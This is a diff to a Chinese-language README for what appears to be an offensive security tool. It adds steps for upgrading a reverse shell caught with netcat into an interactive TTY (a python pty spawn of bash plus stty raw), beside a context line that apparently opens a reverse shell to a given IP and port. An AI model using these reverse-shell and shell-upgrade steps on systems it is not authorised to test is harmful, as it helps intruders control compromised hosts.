@@ -120,6 +120,13 @@ list
 ```
 reverse 112.55.4.22 56789
 ```
+nc获得shell后，kali/ubuntu可通过如下命令升级交互式shell
+```
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-Z
+$ stty raw -echo
+$ fg
+```
 # systemd-resolve占用53端口的解决方法
 以ubuntu为例，编辑
 ```
